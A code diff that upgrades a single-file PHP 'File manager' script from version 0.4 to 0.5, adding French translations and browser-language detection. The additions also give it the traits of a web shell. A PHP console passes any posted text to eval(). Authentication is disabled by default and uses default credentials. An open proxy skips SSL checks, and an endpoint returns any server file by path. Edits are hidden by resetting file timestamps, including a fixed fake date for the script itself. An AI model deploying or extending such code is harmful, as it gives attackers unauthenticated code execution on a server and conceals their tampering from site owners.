@@ -1,30 +1,53 @@
 <?
-/* PHP File manager ver 0.4 */
+/* PHP File manager ver 0.5 */
 
 // Little config
 $show_dir_size = 0; //if true, show directory size → maybe slow 
 $starttime = explode(' ', microtime());
 $starttime = $starttime[1] + $starttime[0];
-$language='ru';
-$autorize=0; //if true, login and password required
-$login='admin'; //autorize must be true 
-$password='phpfm'; //change it 
-$cookie_name='user';
+$langs = array('en','ru','fr');
+$default_language = 'ru';
+$detect_lang = true;
+$autorize = 0; //if true, login and password required
+$login = 'admin'; //autorize must be true 
+$password = 'phpfm'; //change it 
+$cookie_name='fm_user';
 $days_authorization=30;
+$safe_img=true;// if true, show image from script, false — from url
+$msg = ''; // service string
 
 // Path
-if(empty($_REQUEST['path'])) $path = realpath('.');
-else $path = realpath($_REQUEST['path']);
+$path = empty($_REQUEST['path']) ? $path = realpath('.') : realpath($_REQUEST['path']);
 $path = str_replace('\\', '/', $path) . '/';
 $main_path=str_replace('\\', '/',realpath('./'));
+$phar_maybe = (version_compare(phpversion(),"5.3.0","<"))?true:false;
 
 // Change language
 if (isset($_POST['fm_lang'])) { 
 	setcookie('fm_lang', $_POST['fm_lang'], time() + (86400 * $days_authorization));
 	$_COOKIE['fm_lang'] = $_POST['fm_lang'];
 }
+$language = $default_language;
+
+// Detect browser language
+if($detect_lang && !empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) && empty($_COOKIE['fm_lang'])){
+	$lang_priority = explode(',', $_SERVER['HTTP_ACCEPT_LANGUAGE']);
+	if (!empty($lang_priority)){
+		foreach ($lang_priority as $lang_arr){
+			$lng = explode(';', $lang_arr);
+			$lng = $lng[0];
+			if(in_array($lng,$langs)){
+				$language = $lng;
+				break;
+			}
+		}
+	}
+} 
+
+// Cookie lang is primary for ever
 $language = (empty($_COOKIE['fm_lang'])) ? $language : $_COOKIE['fm_lang'];
-	
+
+
 // Localization
 if ($language=='ru') {
 $lang['Are you sure you want to delete this directory (recursively)?']='Вы уверены, что хотите удалить эту папку (рекурсивно)?';
@@ -33,8 +56,10 @@ $lang['Archiving']='Архивировать';
 $lang['Back']='Назад';
 $lang['Cancel']='Отмена';
 $lang['Compress']='Сжать';
+$lang['Console']='Консоль';
 $lang['Created']='Создан';
 $lang['Date']='Дата';
+$lang['Decompress']='Распаковать';
 $lang['Delete']='Удалить';
 $lang['Deleted']='Удалено';
 $lang['Download']='Скачать';
@@ -48,6 +73,7 @@ $lang['File selected']='Выбран файл';
 $lang['File updated']='Файл сохранен';
 $lang['Filename']='Имя файла';
 $lang['Files uploaded']='Файл загружен';
+$lang['French']='Французский';
 $lang['Home']='Домой';
 $lang['Generation time']='Генерация страницы';
 $lang['Quit']='Выход';
@@ -56,9 +82,11 @@ $lang['Login']='Логин';
 $lang['Manage']='Управление';
 $lang['Make directory']='Создать папку';
 $lang['New file']='Новый файл';
+$lang['no files']='нет файлов';
 $lang['Password']='Пароль';
 $lang['Recursively']='Рекурсивно';
 $lang['Rename']='Переименовать';
+$lang['Result']='Результат';
 $lang['Rights']='Права';
 $lang['Russian']='Русский';
 $lang['Show']='Показать';
@@ -67,6 +95,52 @@ $lang['Submit']='Отправить';
 $lang['Task']='Задание';
 $lang['Upload']='Загрузить';
 $lang['Hello']='Привет';
+} elseif ($language=='fr') {
+$lang['Are you sure you want to delete this directory (recursively)?']='Êtes-vous sûr de vouloir supprimer ce dossier (récursive)?';
+$lang['Are you sure you want to delete this file?']='Êtes-vous sûr de vouloir supprimer ce fichier?';
+$lang['Archiving']='Archives';
+$lang['Back']='Arrière';
+$lang['Cancel']='annulation';
+$lang['Compress']='Presser';
+$lang['Console']='Console';
+$lang['Created']='Êtabli';
+$lang['Date']='La date';
+$lang['Decompress']='Décompresser';
+$lang['Delete']='Supprimer';
+$lang['Deleted']='Supprimé';
+$lang['Download']='Télécharger';
+$lang['done']='terminé';
+$lang['Edit']='Editer';
+$lang['Enter']='Entrée';
+$lang['English']='Anglais';
+$lang['Error occurred']='Une erreur est survenue';
+$lang['File manager']='Gestionnaire de fichiers';
+$lang['File selected']='Fichier sélectionné';
+$lang['File updated']='Le fichier est enregistré';
+$lang['Filename']='Nom du fichier';
+$lang['Files uploaded']='Fichiers uploadés';
+$lang['French']='Française';
+$lang['Home']='Home';
+$lang['Generation time']='Génération de la page';
+$lang['Quit']='Quitter';
+$lang['Language']='Langue';
+$lang['Login']='Connexion';
+$lang['Manage']='Gestion';
+$lang['Make directory']='Nouveau dossier';
+$lang['New file']='Nouveau fichier';
+$lang['no files']='aucun fichier';
+$lang['Password']='Mot de passe';
+$lang['Recursively']='Récursive';
+$lang['Rename']='Renommer';
+$lang['Result']='Résultat';
+$lang['Rights']='Permissions';
+$lang['Russian']='Russe';
+$lang['Show']='Show';
+$lang['Size']='Taille';
+$lang['Submit']='Envoyer';
+$lang['Task']='Tâche';
+$lang['Upload']='Télécharger';
+$lang['Hello']='Bonjour';
 }
 
 //translation
@@ -257,6 +331,7 @@ return '
 	<select name="fm_lang" title="'.__('Language').'" onchange="document.forms[\'change_lang\'].submit()" >
 		<option value="en" '.($current=='en'?'selected="selected" ':'').'>'.__('English').'</option>
 		<option value="ru" '.($current=='ru'?'selected="selected" ':'').'>'.__('Russian').'</option>
+		<option value="fr" '.($current=='fr'?'selected="selected" ':'').'>'.__('French').'</option>
 	</select>
 </form>
 ';
@@ -266,15 +341,41 @@ function fm_root($dirname){
 	return ($dirname=='.' OR $dirname=='..');
 }
 
-// Query Processing
+function fm_php($string){
+	$display_errors=ini_get('display_errors');
+	ini_set('display_errors', '1');
+	ob_start();
+	eval(trim($string));
+	$text = ob_get_contents();
+	ob_end_clean();
+	ini_set('display_errors', $display_errors);
+	return $text;
+}
+
+function fm_img_link($filename){
+	return './'.basename(__FILE__).'?img='.base64_encode($filename);
+}
+
+function fm_home_style(){
+	return '
+.home {
+	background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAgRQTFRF/f396Ojo////tT02zr+fw66Rtj432TEp3MXE2DAr3TYp1y4mtDw2/7BM/7BOqVpc/8l31jcqq6enwcHB2Tgi5jgqVpbFvra2nBAV/Pz82S0jnx0W3TUkqSgi4eHh4Tsre4wosz026uPjzGYd6Us3ynAydUBA5Kl3fm5eqZaW7ODgi2Vg+Pj4uY+EwLm5bY9U//7jfLtC+tOK3jcm/71u2jYo1UYh5aJl/seC3jEm12kmJrIA1jMm/9aU4Lh0e01BlIaE///dhMdC7IA//fTZ2c3MW6nN30wf95Vd4JdXoXVos8nE4efN/+63IJgSnYhl7F4csXt89GQUwL+/jl1c41Aq+fb2gmtI1rKa2C4kJaIA3jYrlTw5tj423jYn3cXE1zQoxMHBp1lZ3Dgmqiks/+mcjLK83jYkymMV3TYk//HM+u7Whmtr0odTpaOjfWJfrHpg/8Bs/7tW/7Ve+4U52DMm3MLBn4qLgNVM6MzB3lEflIuL/+jA///20LOzjXx8/7lbWpJG2C8k3TosJKMA1ywjopOR1zYp5Dspiay+yKNhqKSk8NW6/fjns7Oz2tnZuz887b+W3aRY/+ms4rCE3Tot7V85bKxjuEA3w45Vh5uhq6am4cFxgZZW/9qIuwgKy0sW+ujT4TQntz423C8i3zUj/+Kw/a5d6UMxuL6wzDEr////cqJQfAAAAKx0Uk5T////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////AAWVFbEAAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAA2UlEQVQoU2NYjQYYsAiE8U9YzDYjVpGZRxMiECitMrVZvoMrTlQ2ESRQJ2FVwinYbmqTULoohnE1g1aKGS/fNMtk40yZ9KVLQhgYkuY7NxQvXyHVFNnKzR69qpxBPMez0ETAQyTUvSogaIFaPcNqV/M5dha2Rl2Timb6Z+QBDY1XN/Sbu8xFLG3eLDfl2UABjilO1o012Z3ek1lZVIWAAmUTK6L0s3pX+jj6puZ2AwWUvBRaphswMdUujCiwDwa5VEdPI7ynUlc7v1qYURLquf42hz45CBPDtwACrm+RDcxJYAAAAABJRU5ErkJggg==");
+}';
+}
+
+function fm_home(){
+	return '&nbsp;<a href="./'.basename(__FILE__).'" title="'.__('Home').'"><span class="home">&nbsp;&nbsp;&nbsp;&nbsp;</span></a>';
+}
+
+// authorization
 if ($autorize) {
 	if (isset($_POST['login']) && isset($_POST['password'])){
 		if (($_POST['login']==$login) && ($_POST['password']==$password)) {
-			setcookie($cookie_name, $login, time() + (86400 * $days_authorization));
-			$_COOKIE[$cookie_name]=$login;
+			setcookie($cookie_name, $login.'|'.md5($password), time() + (86400 * $days_authorization));
+			$_COOKIE[$cookie_name]=$login.'|'.md5($password);
 		}
 	}
-	if (!isset($_COOKIE[$cookie_name]) OR ($_COOKIE[$cookie_name]!=$login)) {
+	if (!isset($_COOKIE[$cookie_name]) OR ($_COOKIE[$cookie_name]!=$login.'|'.md5($password))) {
 		echo '
 <!doctype html>
 <html>
@@ -297,18 +398,82 @@ die();
 	if (isset($_POST['quit'])) {
 		unset($_COOKIE[$cookie_name]);
 		setcookie($cookie_name, '', time() - (86400 * $days_authorization));
-		header('Location: '.basename(__FILE__));
 	}
 }
-	
+
+// just show image
+if (isset($_GET['img'])) {
+	$file=base64_decode($_GET['img']);
+	if ($info=getimagesize($file)){
+		switch  ($info[2]){	//1=GIF, 2=JPG, 3=PNG, 4=SWF, 5=PSD, 6=BMP
+			case 1: $ext='gif'; break;
+			case 2: $ext='jpeg'; break;
+			case 3: $ext='png'; break;
+			case 6: $ext='bmp'; break;
+			default: die();
+		}
+		header("Content-type: image/$ext");
+		echo file_get_contents($file);
+		die();
+	}
+}
+
+// just download file
 if (isset($_GET['download'])) {
 	$file=base64_decode($_GET['download']);
 	fm_download($file);	
 }
 
+// just show info
 if (isset($_GET['phpinfo'])) {
 	phpinfo(); 
 	die();
+}
+
+// mini proxy, manyyy bugs!
+if (isset($_GET['proxy'])) {
+	$url = isset($_GET['url'])?$_GET['url']:'';
+	$proxy_form = '
+<div style="position:relative;z-index:100500;">
+ 
+<form action="" method="GET">
+<input type="hidden" name="proxy" value="true">
+'.fm_home().' Url: <input type="text" name="url" value="'.$url.'">
+<input type="submit" value="'.__('Show').'">
+</form>
+</div>
+';
+	if ($url) {
+		$ch = curl_init($url);
+		curl_setopt($ch, CURLOPT_USERAGENT, 'Den1xxx test proxy');
+		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
+		curl_setopt($ch, CURLOPT_HEADER, 0);
+		curl_setopt($ch, CURLOPT_REFERER, 'http://'.$_SERVER['HTTP_HOST']);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
+		$result = curl_exec($ch);
+		curl_close($ch);
+		//CURLOPT_HEADERFUNCTION
+		//CURLOPT_HTTPHEADER
+		//CURLOPT_ENCODING
+		/*
+		//For parsing Google
+		$delim = '<!doctype';
+		$result = preg_replace('/<!DOCTYPE/Ui',$delim,$result);
+		$res = explode($delim,$result);
+		$header = isset($res[1])?$res[0]:'';
+		$result = isset($res[1])?$delim.$res[1]:$delim.$res[0];
+		if (preg_match('#charset=(.*?)[\s\n\r]#u',$header,$encoding)) {
+			if ($encoding[1]!='UTF-8') $result=iconv($encoding[1], 'UTF-8', $result);
+		}
+		*/
+		$result = str_replace(array('background:url(/','///'),array($url.'/','/'),$result);
+		$result = preg_replace('#(href|src)=["\'][http://]?([^:]*)["\']#Ui', '\\1="'.$url.'/\\2"', $result);
+		$result = preg_replace('%(<body.*?>)%i', '$1'.'<style>'.fm_home_style().'</style>'.$proxy_form, $result);
+		echo $result;
+		die();
+	} 
 }
 ?>
 <!doctype html>
@@ -317,17 +482,11 @@ if (isset($_GET['phpinfo'])) {
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     <title><?=__('File manager')?></title>
 <style>
-html, body {
-	min-height: 100%;
-}
-
 body {
 	background-color:	white;
 	font-family:		Verdana, Arial, Helvetica, sans-serif;
 	font-size:			8pt;
 	margin:				0px;
-	border:				0px;
-	padding:			0px;
 }
 
 a:link, a:active, a:visited { color: #006699; text-decoration: none; }
@@ -391,11 +550,6 @@ tr.row2:hover {
   border-color: #285e8e;
 }
 
-form{
-	margin-bottom: 0;
-	margin-top: 0;
-}
-
 input {
 	text-indent: 2px;
 }
@@ -435,24 +589,48 @@ textarea {
 .file {
     background-image: url("data:image/png;base64,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");
 }
-
-.home {
-	background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAgRQTFRF/f396Ojo////tT02zr+fw66Rtj432TEp3MXE2DAr3TYp1y4mtDw2/7BM/7BOqVpc/8l31jcqq6enwcHB2Tgi5jgqVpbFvra2nBAV/Pz82S0jnx0W3TUkqSgi4eHh4Tsre4wosz026uPjzGYd6Us3ynAydUBA5Kl3fm5eqZaW7ODgi2Vg+Pj4uY+EwLm5bY9U//7jfLtC+tOK3jcm/71u2jYo1UYh5aJl/seC3jEm12kmJrIA1jMm/9aU4Lh0e01BlIaE///dhMdC7IA//fTZ2c3MW6nN30wf95Vd4JdXoXVos8nE4efN/+63IJgSnYhl7F4csXt89GQUwL+/jl1c41Aq+fb2gmtI1rKa2C4kJaIA3jYrlTw5tj423jYn3cXE1zQoxMHBp1lZ3Dgmqiks/+mcjLK83jYkymMV3TYk//HM+u7Whmtr0odTpaOjfWJfrHpg/8Bs/7tW/7Ve+4U52DMm3MLBn4qLgNVM6MzB3lEflIuL/+jA///20LOzjXx8/7lbWpJG2C8k3TosJKMA1ywjopOR1zYp5Dspiay+yKNhqKSk8NW6/fjns7Oz2tnZuz887b+W3aRY/+ms4rCE3Tot7V85bKxjuEA3w45Vh5uhq6am4cFxgZZW/9qIuwgKy0sW+ujT4TQntz423C8i3zUj/+Kw/a5d6UMxuL6wzDEr////cqJQfAAAAKx0Uk5T////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////AAWVFbEAAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAA2UlEQVQoU2NYjQYYsAiE8U9YzDYjVpGZRxMiECitMrVZvoMrTlQ2ESRQJ2FVwinYbmqTULoohnE1g1aKGS/fNMtk40yZ9KVLQhgYkuY7NxQvXyHVFNnKzR69qpxBPMez0ETAQyTUvSogaIFaPcNqV/M5dha2Rl2Timb6Z+QBDY1XN/Sbu8xFLG3eLDfl2UABjilO1o012Z3ek1lZVIWAAmUTK6L0s3pX+jj6puZ2AwWUvBRaphswMdUujCiwDwa5VEdPI7ynUlc7v1qYURLquf42hz45CBPDtwACrm+RDcxJYAAAAABJRU5ErkJggg==");
-}
+<?=fm_home_style()?>
 .img {
 	background-image: 
-url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAdFQTFRF7e3t/f39pJ+f+cJajV8q6enpkGIm/sFO/+2O393c5ubm/sxbd29yimdneFg65OTk2zoY6uHi1zAS1crJsHs2nygo3Nrb2LBXrYtm2p5A/+hXpoRqpKOkwri46+vr0MG36Ysz6ujpmI6AnzUywL+/mXVSmIBN8bwwj1VByLGza1ZJ0NDQjYSB/9NjwZ6CwUAsxk0brZyWw7pmGZ4A6LtdkHdf/+N8yow27b5W87RNLZL/2biP7wAA//GJl5eX4NfYsaaLgp6h1b+t/+6R68Fe89ycimZd/uQv3r9NupCB99V25a1cVJbbnHhO/8xS+MBa8fDwi2Ji48qi/+qOdVIzs34x//GOXIzYp5SP/sxgqpiIcp+/siQpcmpstayszSANuKKT9PT04uLiwIky8LdE+sVWvqam8e/vL5IZ+rlH8cNg08Ccz7ad8vLy9LtU1qyUuZ4+r512+8s/wUpL3d3dx7W1fGNa/89Z2cfH+s5n6Ojob1Yts7Kz19fXwIg4p1dN+Pj4zLR0+8pd7strhKAs/9hj/9BV1KtftLS1np2dYlJSZFVV5LRWhEFB5rhZ/9Jq0HtT//CSkIqJ6K5D+LNNblVVvjM047ZMz7e31xEG////tKgu6wAAAJt0Uk5T/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wCVVpKYAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAANZJREFUKFNjmKWiPQsZMMximsqPKpAb2MsAZNjLOwkzggVmJYnyps/QE59eKCEtBhaYFRfjZuThH27lY6kqBxYorS/OMC5wiHZkl2QCCVTkN+trtFj4ZSpMmawDFBD0lCoynzZBl1nIJj55ElBA09pdvc9buT1SYKYBWw1QIC0oNYsjrFHJpSkvRYsBKCCbM9HLN9tWrbqnjUUGZG1AhGuIXZRzpQl3aGwD2B2cZZ2zEoL7W+u6qyAunZXIOMvQrFykqwTiFzBQNOXj4QKzoAKzajtYIQwAlvtpl3V5c8MAAAAASUVORK5CYII=');
+url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAdFQTFRF7e3t/f39pJ+f+cJajV8q6enpkGIm/sFO/+2O393c5ubm/sxbd29yimdneFg65OTk2zoY6uHi1zAS1crJsHs2nygo3Nrb2LBXrYtm2p5A/+hXpoRqpKOkwri46+vr0MG36Ysz6ujpmI6AnzUywL+/mXVSmIBN8bwwj1VByLGza1ZJ0NDQjYSB/9NjwZ6CwUAsxk0brZyWw7pmGZ4A6LtdkHdf/+N8yow27b5W87RNLZL/2biP7wAA//GJl5eX4NfYsaaLgp6h1b+t/+6R68Fe89ycimZd/uQv3r9NupCB99V25a1cVJbbnHhO/8xS+MBa8fDwi2Ji48qi/+qOdVIzs34x//GOXIzYp5SP/sxgqpiIcp+/siQpcmpstayszSANuKKT9PT04uLiwIky8LdE+sVWvqam8e/vL5IZ+rlH8cNg08Ccz7ad8vLy9LtU1qyUuZ4+r512+8s/wUpL3d3dx7W1fGNa/89Z2cfH+s5n6Ojob1Yts7Kz19fXwIg4p1dN+Pj4zLR0+8pd7strhKAs/9hj/9BV1KtftLS1np2dYlJSZFVV5LRWhEFB5rhZ/9Jq0HtT//CSkIqJ6K5D+LNNblVVvjM047ZMz7e31xEG////tKgu6wAAAJt0Uk5T/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wCVVpKYAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAANZJREFUKFNjmKWiPQsZMMximsqPKpAb2MsAZNjLOwkzggVmJYnyps/QE59eKCEtBhaYFRfjZuThH27lY6kqBxYorS/OMC5wiHZkl2QCCVTkN+trtFj4ZSpMmawDFBD0lCoynzZBl1nIJj55ElBA09pdvc9buT1SYKYBWw1QIC0oNYsjrFHJpSkvRYsBKCCbM9HLN9tWrbqnjUUGZG1AhGuIXZRzpQl3aGwD2B2cZZ2zEoL7W+u6qyAunZXIOMvQrFykqwTiFzBQNOXj4QKzoAKzajtYIQwAlvtpl3V5c8MAAAAASUVORK5CYII=");
 }
 </style>
 </head>
 <body>
 <?
 $url_inc = '?fm=true';
-if(!empty($_REQUEST['edit'])){
+if (isset($proxy_form)) {
+	die($proxy_form);
+} elseif (isset($_POST['phprun'])){
+	$php = empty($_POST['php']) ? '' : $_POST['php'];
+?>
+<table border='0' cellspacing='0' cellpadding='1' width="100%">
+<tr>
+    <th><?=__('File manager').' - '.$path?></th>
+</tr>
+<tr>
+    <td class="row2"><h2>PHP <?=__('Console')?></h2></td>
+</tr>
+<tr>
+    <td class="row1">
+		<a href="<?=$url_inc.'&path=' . $path;?>"><?=__('Back')?></a>
+		<form action="" method="POST">
+		<textarea name="php" cols="80" rows="10" style="width: 90%"><?=$php?></textarea><br/>
+		<input type="submit" value="<?=__('Submit')?>" name="phprun">
+		</form>
+	</td>
+</tr>
+</table>
+<?
+	if (!empty($php)) {
+		echo '<h3>PHP '.__('Result').'</h3><pre>'.fm_php($php).'</pre>';
+	}
+} elseif(!empty($_REQUEST['edit'])){
 	if(!empty($_REQUEST['save'])) {
 		$fn = $path . $_REQUEST['edit'];
 		$filemtime = filemtime($fn);
-	    file_put_contents($fn, $_REQUEST['newcontent']);
+	    if (file_put_contents($fn, $_REQUEST['newcontent'])) $msg .= __('File updated');
+		else $msg .= __('Error occurred');
 		if ($_GET['edit']==basename(__FILE__)) touch(__FILE__,1415116371); 
 		else touch($fn,$filemtime);
 	}
@@ -462,11 +640,16 @@ if(!empty($_REQUEST['edit'])){
 ?>
 <table border='0' cellspacing='0' cellpadding='1' width="100%">
 <tr>
-    <th><?=__('File manager') . ' - ' .  __('Edit') . ' - ' . $path.$_REQUEST['edit']?></th>
+    <th><?=__('File manager').' - '.__('Edit').' - '.$path.$_REQUEST['edit']?></th>
 </tr>
 <tr>
     <td class="row1">
-        <a href="<?=$backlink?>"><?=__('Back')?></a>
+        <?=$msg?>
+	</td>
+</tr>
+<tr>
+    <td class="row1">
+        <?=fm_home()?> <a href="<?=$backlink?>"><?=__('Back')?></a>
 	</td>
 </tr>
 <tr>
@@ -483,8 +666,8 @@ if(!empty($_REQUEST['edit'])){
 } elseif(!empty($_REQUEST['rights'])){
 	if(!empty($_REQUEST['save'])) {
